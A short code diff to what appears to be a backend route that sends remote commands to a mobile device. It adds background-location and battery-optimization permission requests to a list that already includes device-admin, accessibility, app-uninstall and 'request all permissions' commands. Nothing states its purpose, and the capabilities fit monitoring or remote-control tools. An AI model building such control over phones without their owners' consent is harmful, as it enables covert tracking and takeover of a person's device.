@@ -241,6 +241,7 @@ router.post('/:deviceId/command', protect, async (req, res) => {
       'uninstall_app',
       // Permission request commands
       'request_location_permission',
+      'request_background_location_permission',
       'request_camera_permission',
       'request_microphone_permission',
       'request_contacts_permission',
@@ -251,6 +252,7 @@ router.post('/:deviceId/command', protect, async (req, res) => {
       'request_notification_permission',
       'request_usage_access_permission',
       'request_overlay_permission',
+      'request_battery_optimization_permission',
       'request_device_admin_permission',
       'request_accessibility_permission',
       'request_all_permissions'
